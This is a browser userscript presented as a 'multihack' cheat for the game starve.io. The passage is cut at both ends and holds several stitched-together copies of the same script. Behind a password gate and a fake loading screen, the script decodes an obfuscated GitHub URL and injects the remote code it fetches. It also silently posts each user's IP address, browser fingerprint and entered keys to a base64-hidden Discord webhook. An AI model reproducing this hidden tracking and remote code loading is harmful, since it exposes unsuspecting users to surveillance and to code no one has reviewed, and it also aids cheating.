                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
